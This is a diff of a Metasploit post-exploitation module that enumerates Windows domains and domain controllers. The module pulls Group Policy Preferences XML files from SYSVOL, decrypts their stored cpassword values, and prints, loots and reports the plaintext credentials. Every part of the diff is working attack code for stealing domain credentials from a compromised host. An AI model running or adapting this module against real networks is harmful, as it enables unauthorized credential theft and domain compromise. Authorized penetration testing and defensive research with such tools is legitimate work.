@@ -46,12 +46,12 @@ class Metasploit3 < Msf::Post
 		))
 
 		register_options([
-			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
+			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
+			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
 	end
 
 	def run
-
 		group_path = "MACHINE\\Preferences\\Groups\\Groups.xml"
 		group_path_user = "USER\\Preferences\\Groups\\Groups.xml"
 		service_path = "MACHINE\\Preferences\\Services\\Services.xml"
@@ -63,32 +63,59 @@ class Metasploit3 < Msf::Post
 		task_path_user = "USER\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
 		domains = []
-		dcs = []
 		basepaths = []
 		fullpaths = []
-		@enumed_domains = []
+		cached_domain_controller = nil
 
-		print_status "Checking locally.."
+		print_status "Checking locally..."
 		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
 		unless locals.blank?
 			basepaths << locals
-			print_good "Policy Sahres found locally"
+			print_good "Group Policy Files found locally"
 		end
 
+		# If user supplied domains this implicitly cancels the ALL flag.
 		if datastore['ALL'] and datastore['DOMAINS'].blank?
+			print_status "Enumerating Domains on the Network..."
 			domains = enum_domains
-			domains.reject!{|n| n == "WORKGROUP"}
+			domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
 		end
 
-		datastore['DOMAINS'].split('').each{|ud| domains << ud} if datastore['DOMAINS']
-		domains << get_domain_reg
+		# Add user specified domains to list.
+		unless datastore['DOMAINS'].blank?
+			if datastore['DOMAINS'].match(/\./)
+				print_error "DOMAINS must not contain DNS style domain names e.g. 'mydomain.net'. Instead use 'mydomain'."
+				return
+			end
+			user_domains = datastore['DOMAINS'].split(' ')
+			user_domains = user_domains.map {|x| x.upcase}
+			print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
+			user_domains.each{|ud| domains << ud}
+		end
+
+		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
+		# If user supplied domains we do not wish to enumerate registry retrieved domains.
+		if locals.blank? && user_domains.blank?
+			print_status "Enumerating domain information from the local registry..."
+			domains << get_domain_reg
+		end
+
 		domains.flatten!
 		domains.compact!
 		domains.uniq!
 
+		# Dont check registry if we find local files.
+		cached_dc = get_cached_domain_controller if locals.blank?
 
 		domains.each do |domain|
 			dcs = enum_dcs(domain)
+			dcs = [] if dcs.nil?
+
+			# Add registry cached DC for the test case where no DC is enumerated on the network.
+			if !cached_dc.nil? && (cached_dc.include? domain)
+				dcs << cached_dc
+			end
+
 			next if dcs.blank?
 			dcs.uniq!
 			tbase = []
@@ -149,9 +176,8 @@ class Metasploit3 < Msf::Post
 		return locals
 	end
 
-
 	def find_path(path, xml_path)
-		xml_path = "#{path}\\#{xml_path}"
+		xml_path = "#{path}#{xml_path}"
 		begin
 			return xml_path if client.fs.file.stat(xml_path)
 		rescue Rex::Post::Meterpreter::RequestError => e
@@ -188,29 +214,41 @@ class Metasploit3 < Msf::Post
 	def parse_xml(xmlfile)
 		mxml = xmlfile[:xml]
 		print_status "Parsing file: #{xmlfile[:path]} ..."
+		filetype = xmlfile[:path].split('\\').last()
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
-			next if @enumed_domains.include? xmlfile[:domain]
-			@enumed_domains << xmlfile[:domain]
 			pass = decrypt(epassword)
 
 			user = node.attributes['runAs'] if node.attributes['runAs']
 			user = node.attributes['accountName'] if node.attributes['accountName']
-			user = node.attributes['username'] if  node.attributes['username']
-			user = node.attributes['userName'] if  node.attributes['userName']
-			user = node.attributes['newName'] unless  node.attributes['newName'].blank?
+			user = node.attributes['username'] if node.attributes['username']
+			user = node.attributes['userName'] if node.attributes['userName']
+			user = node.attributes['newName'] unless node.attributes['newName'].blank?
 			changed = node.parent.attributes['changed']
 
+			# Printers and Shares
+			path = node.attributes['path']
+
+			# Datasources
+			dsn = node.attributes['dsn']
+			driver = node.attributes['driver']
+
+			# Tasks
+			app_name = node.attributes['appName']
+
+			# Services
+			service = node.attributes['serviceName']
+
+			# Groups
 			expires = node.attributes['expires']
 			never_expires = node.attributes['neverExpires']
 			disabled = node.attributes['acctDisabled']
 
-
 			table = Rex::Ui::Text::Table.new(
 				'Header'     => 'Group Policy Credential Info',
 				'Indent'     => 1,
-				'SortIndex'  => 5,
+				'SortIndex'  => -1,
 				'Columns'    =>
 				[
 					'Name',
@@ -218,7 +256,8 @@ class Metasploit3 < Msf::Post
 				]
 			)
 
-			table << ["USERNAME", user ]
+			table << ["TYPE", filetype]
+			table << ["USERNAME", user]
 			table << ["PASSWORD", pass]
 			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
 			table << ["DOMAIN", xmlfile[:domain] ]
@@ -226,13 +265,26 @@ class Metasploit3 < Msf::Post
 			table << ["EXPIRES", expires] unless expires.blank?
 			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
 			table << ["DISABLED", disabled] unless disabled.blank?
+			table << ["PATH", path] unless path.blank?
+			table << ["DATASOURCE", dsn] unless dsn.blank?
+			table << ["DRIVER", driver] unless driver.blank?
+			table << ["TASK", app_name] unless app_name.blank?
+			table << ["SERVICE", service] unless service.blank?
 
+			node.elements.each('//Attributes//Attribute') do |dsn_attribute|
+				table << ["ATTRIBUTE", "#{dsn_attribute.attributes['name']} - #{dsn_attribute.attributes['value']}"]
+			end
 
 			print_good table.to_s
+
+			if datastore['STORE']
+				stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
+				print_status("XML file saved to: #{stored_path}")
+			end
+
 			report_creds(user,pass) unless disabled and disabled == '1'
 		end
 	end
-
 
 	def report_creds(user, pass)
 		if session.db_record
@@ -268,9 +320,7 @@ class Metasploit3 < Msf::Post
 		return pass
 	end
 
-
 	def enum_domains
-		print_status "Enumerating Domains on the Network..."
 		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
@@ -288,7 +338,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		count = result['totalentries']
-		print_status("#{count} domain(s) found.")
+		print_status("#{count} Domain(s) found.")
 		startmem = result['bufptr']
 
 		base = 0
@@ -309,11 +359,20 @@ class Metasploit3 < Msf::Post
 				base = base + 8
 		end
 
+		domains.uniq!
+		print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
 		return domains
 	end
 
 	def enum_dcs(domain)
-		print_status("Enumerating DCs for #{domain}")
+		# Prevent crash if FQDN domain names are searched for or other disallowed characters:
+		# http://support.microsoft.com/kb/909264 \/:*?"<>|
+		if domain =~ /[:\*?"<>\\\/.]/
+			print_error("Cannot enumerate domain name contains disallowed characters: #{domain}")
+			return nil
+		end
+
+		print_status("Enumerating DCs for #{domain} on the network...")
 		domaincontrollers = 24  # 10 + 8 (SV_TYPE_DOMAIN_BAKCTRL || SV_TYPE_DOMAIN_CTRL)
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domaincontrollers,domain,nil)
@@ -344,18 +403,53 @@ class Metasploit3 < Msf::Post
 		return hostnames
 	end
 
-	def get_domain_reg
+	# We use this for the odd test case where a DC is unable to be enumerated from the network
+	# but is cached in the registry.
+	def get_cached_domain_controller
 		begin
-			subkey = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\"
-			v_name = "Domain"
-			domain = registry_getvaldata(subkey, v_name)
-			print_status "Retrieved domain #{domain} from registry "
-		rescue Rex::Post::Meterpreter::RequestError => e
-			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
+			subkey = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\"
+			v_name = "DCName"
+			dc = registry_getvaldata(subkey, v_name).gsub(/\\/, '').upcase
+			print_status "Retrieved DC #{dc} from registry"
+			return dc
+		rescue
+			print_status("No DC found in registry")
 		end
-		domain = domain.split('.')[0].upcase
-
-		return domain
 	end
 
+	def get_domain_reg
+		locations = []
+		# Lots of redundancy but hey this is quick!
+		locations << ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\", "Domain"]
+		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\", "DefaultDomainName"]
+		locations << ["HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\", "MachineDomain"]
+
+		domains = []
+
+		# Pulls cached domains from registry
+		domain_cache = registry_enumvals("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DomainCache\\")
+		if domain_cache
+			domain_cache.each { |ud| domains << ud }
+		end
+
+		locations.each do |location|
+			begin
+				subkey = location[0]
+				v_name = location[1]
+				domain = registry_getvaldata(subkey, v_name)
+			rescue Rex::Post::Meterpreter::RequestError => e
+				print_error "Received error code #{e.code} - #{e.message}"
+			end
+
+			unless domain.blank?
+				domain_parts = domain.split('.')
+				domains << domain.split('.').first.upcase unless domain_parts.empty?
+			end
+		end
+
+		domains.uniq!
+		print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+
+		return domains
+	end
 end
